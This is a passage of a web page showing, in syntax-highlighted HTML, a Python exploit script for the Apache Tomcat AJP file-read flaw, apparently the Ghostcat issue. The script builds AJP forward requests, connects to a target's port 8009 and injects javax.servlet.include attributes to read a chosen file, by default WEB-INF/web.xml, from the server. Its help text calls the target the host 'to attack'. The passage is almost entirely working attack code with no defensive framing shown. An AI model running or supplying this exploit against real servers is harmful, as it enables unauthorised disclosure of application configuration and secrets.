				h_name <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">.</span>COMMON_HEADERS<span class="token punctuation">[</span>code <span class="token operator">-</span> <span class="token number">0xA001</span><span class="token punctuation">]</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				h_name <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;%ds&quot;</span> <span class="token operator">%</span> code<span class="token punctuation">)</span>
				stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># \\0</span>
			h_value <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
			self<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span>h_name<span class="token punctuation">]</span> <span class="token operator">=</span> h_value
	<span class="token keyword">def</span> <span class="token function">send_and_receive</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> stream<span class="token punctuation">,</span> save_cookies<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
		i <span class="token operator">=</span> socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>self<span class="token punctuation">.</span>serialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> self<span class="token punctuation">.</span>method <span class="token operator">==</span> AjpForwardRequest<span class="token punctuation">.</span>POST<span class="token punctuation">:</span>
			<span class="token keyword">return</span> res

		r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">assert</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS
		res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
		<span class="token keyword">if</span> save_cookies <span class="token keyword">and</span> <span class="token string">&#39;Set-Cookie&#39;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>response_headers<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">&#39;SC_REQ_COOKIE&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">.</span>response_headers<span class="token punctuation">[</span><span class="token string">&#39;Set-Cookie&#39;</span><span class="token punctuation">]</span>

		<span class="token comment"># read body chunks and end response packets</span>
		<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
			r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
			res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
			<span class="token keyword">if</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>END_RESPONSE<span class="token punctuation">:</span>
				<span class="token keyword">break</span>
			<span class="token keyword">elif</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_BODY_CHUNK<span class="token punctuation">:</span>
				<span class="token keyword">continue</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token keyword">raise</span> NotImplementedError
				<span class="token keyword">break</span>

		<span class="token keyword">return</span> res

<span class="token keyword">class</span> <span class="token class-name">AjpResponse</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	_<span class="token punctuation">,</span>_<span class="token punctuation">,</span>_<span class="token punctuation">,</span>SEND_BODY_CHUNK<span class="token punctuation">,</span> SEND_HEADERS<span class="token punctuation">,</span> END_RESPONSE<span class="token punctuation">,</span> GET_BODY_CHUNK <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
	COMMON_SEND_HEADERS <span class="token operator">=</span> <span class="token punctuation">[</span>
			<span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Content-Language&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Content-Length&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Date&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Last-Modified&quot;</span><span class="token punctuation">,</span>
			<span class="token string">&quot;Location&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Set-Cookie&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Set-Cookie2&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Servlet-Engine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Status&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;WWW-Authenticate&quot;</span>
			<span class="token punctuation">]</span>
	<span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># read headers</span>
		self<span class="token punctuation">.</span>magic<span class="token punctuation">,</span> self<span class="token punctuation">.</span>data_length<span class="token punctuation">,</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;HHb&quot;</span><span class="token punctuation">)</span>

		<span class="token keyword">if</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>parse_send_headers<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">elif</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_BODY_CHUNK<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>parse_send_body_chunk<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">elif</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>END_RESPONSE<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>parse_end_response<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">elif</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>GET_BODY_CHUNK<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>parse_get_body_chunk<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token keyword">raise</span> NotImplementedError

	<span class="token keyword">def</span> <span class="token function">parse_send_headers</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>http_status_code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>http_status_msg <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>num_headers<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>response_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
		<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
			code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> code <span class="token operator">&lt;=</span> <span class="token number">0xA000</span><span class="token punctuation">:</span> <span class="token comment"># custom header</span>
				h_name<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;%ds&quot;</span> <span class="token operator">%</span> code<span class="token punctuation">)</span>
				stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># \\0</span>
				h_value <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				h_name <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>COMMON_SEND_HEADERS<span class="token punctuation">[</span>code<span class="token operator">-</span><span class="token number">0xA001</span><span class="token punctuation">]</span>
				h_value <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
			self<span class="token punctuation">.</span>response_headers<span class="token punctuation">[</span>h_name<span class="token punctuation">]</span> <span class="token operator">=</span> h_value

	<span class="token keyword">def</span> <span class="token function">parse_send_body_chunk</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>data_length<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>data <span class="token operator">=</span> stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span>self<span class="token punctuation">.</span>data_length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>

	<span class="token keyword">def</span> <span class="token function">parse_end_response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>reuse<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;b&quot;</span><span class="token punctuation">)</span>

	<span class="token keyword">def</span> <span class="token function">parse_get_body_chunk</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		rlen<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> rlen

	<span class="token decorator annotation punctuation">@staticmethod</span>
	<span class="token keyword">def</span> <span class="token function">receive</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		r <span class="token operator">=</span> AjpResponse<span class="token punctuation">(</span><span class="token punctuation">)</span>
		r<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">return</span> r

<span class="token keyword">import</span> socket

<span class="token keyword">def</span> <span class="token function">prepare_ajp_forward_request</span><span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> req_uri<span class="token punctuation">,</span> method<span class="token operator">=</span>AjpForwardRequest<span class="token punctuation">.</span>GET<span class="token punctuation">)</span><span class="token punctuation">:</span>
	fr <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">(</span>AjpForwardRequest<span class="token punctuation">.</span>SERVER_TO_CONTAINER<span class="token punctuation">)</span>
	fr<span class="token punctuation">.</span>method <span class="token operator">=</span> method
	fr<span class="token punctuation">.</span>protocol <span class="token operator">=</span> <span class="token string">&quot;HTTP/1.1&quot;</span>
	fr<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> req_uri
	fr<span class="token punctuation">.</span>remote_addr <span class="token operator">=</span> target_host
	fr<span class="token punctuation">.</span>remote_host <span class="token operator">=</span> <span class="token boolean">None</span>
	fr<span class="token punctuation">.</span>server_name <span class="token operator">=</span> target_host
	fr<span class="token punctuation">.</span>server_port <span class="token operator">=</span> <span class="token number">80</span>
	fr<span class="token punctuation">.</span>request_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
		<span class="token string">&#39;SC_REQ_ACCEPT&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;text/html&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;SC_REQ_CONNECTION&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;keep-alive&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;SC_REQ_CONTENT_LENGTH&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;0&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;SC_REQ_HOST&#39;</span><span class="token punctuation">:</span> target_host<span class="token punctuation">,</span>
		<span class="token string">&#39;SC_REQ_USER_AGENT&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;Accept-Encoding&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;gzip, deflate, sdch&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;Accept-Language&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;en-US,en;q=0.5&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;Upgrade-Insecure-Requests&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;1&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;Cache-Control&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;max-age=0&#39;</span>
	<span class="token punctuation">}</span>
	fr<span class="token punctuation">.</span>is_ssl <span class="token operator">=</span> <span class="token boolean">False</span>
	fr<span class="token punctuation">.</span>attributes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
	<span class="token keyword">return</span> fr

<span class="token keyword">class</span> <span class="token class-name">Tomcat</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>target_host <span class="token operator">=</span> target_host
		self<span class="token punctuation">.</span>target_port <span class="token operator">=</span> target_port

		self<span class="token punctuation">.</span>socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>stream <span class="token operator">=</span> self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>makefile<span class="token punctuation">(</span><span class="token string">&quot;rb&quot;</span><span class="token punctuation">,</span> bufsize<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

	<span class="token keyword">def</span> <span class="token function">perform_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> req_uri<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> attributes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> req_uri
		self<span class="token punctuation">.</span>forward_request <span class="token operator">=</span> prepare_ajp_forward_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>req_uri<span class="token punctuation">,</span> method<span class="token operator">=</span>AjpForwardRequest<span class="token punctuation">.</span>REQUEST_METHODS<span class="token punctuation">.</span>get<span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Getting resource at ajp13://%s:%d%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>target_port<span class="token punctuation">,</span> req_uri<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> password <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span><span class="token string">&#39;SC_REQ_AUTHORIZATION&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;Basic &quot;</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">&quot;%s:%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>user<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;base64&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
		<span class="token keyword">for</span> h <span class="token keyword">in</span> headers<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">=</span> headers<span class="token punctuation">[</span>h<span class="token punctuation">]</span>
		<span class="token keyword">for</span> a <span class="token keyword">in</span> attributes<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>attributes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
		responses <span class="token operator">=</span> self<span class="token punctuation">.</span>forward_request<span class="token punctuation">.</span>send_and_receive<span class="token punctuation">(</span>self<span class="token punctuation">.</span>socket<span class="token punctuation">,</span> self<span class="token punctuation">.</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>responses<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>
		snd_hdrs_res <span class="token operator">=</span> responses<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
		data_res <span class="token operator">=</span> responses<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
		<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_res<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;No data in response. Headers:%s\\n&quot;</span> <span class="token operator">%</span> snd_hdrs_res<span class="token punctuation">.</span>response_headers<span class="token punctuation">)</span>
		<span class="token keyword">return</span> snd_hdrs_res<span class="token punctuation">,</span> data_res

<span class="token triple-quoted-string string">&#39;&#39;&#39;
javax.servlet.include.request_uri
javax.servlet.include.path_info
javax.servlet.include.servlet_path
&#39;&#39;&#39;</span>

<span class="token keyword">import</span> argparse
parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;target&quot;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Hostname or IP to attack&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-p&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--port&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">8009</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;AJP port to attack (default is 8009)&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-f&quot;</span><span class="token punctuation">,</span> <span class="token string">&#39;--file&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&#39;WEB-INF/web.xml&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;file path :(WEB-INF/web.xml)&quot;</span><span class="token punctuation">)</span>
args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
t <span class="token operator">=</span> Tomcat<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span>
_<span class="token punctuation">,</span>data <span class="token operator">=</span> t<span class="token punctuation">.</span>perform_request<span class="token punctuation">(</span><span class="token string">&#39;/asdf&#39;</span><span class="token punctuation">,</span>attributes<span class="token operator">=</span><span class="token punctuation">[</span>
    <span class="token punctuation">{</span><span class="token string">&#39;name&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;req_attribute&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;value&#39;</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">&#39;javax.servlet.include.request_uri&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">&#39;name&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;req_attribute&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;value&#39;</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">&#39;javax.servlet.include.path_info&#39;</span><span class="token punctuation">,</span>args<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">&#39;name&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;req_attribute&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;value&#39;</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">&#39;javax.servlet.include.servlet_path&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;----------------------------&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>d<span class="token punctuation">.</span>data <span class="token keyword">for</span> d <span class="token keyword">in</span> data<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 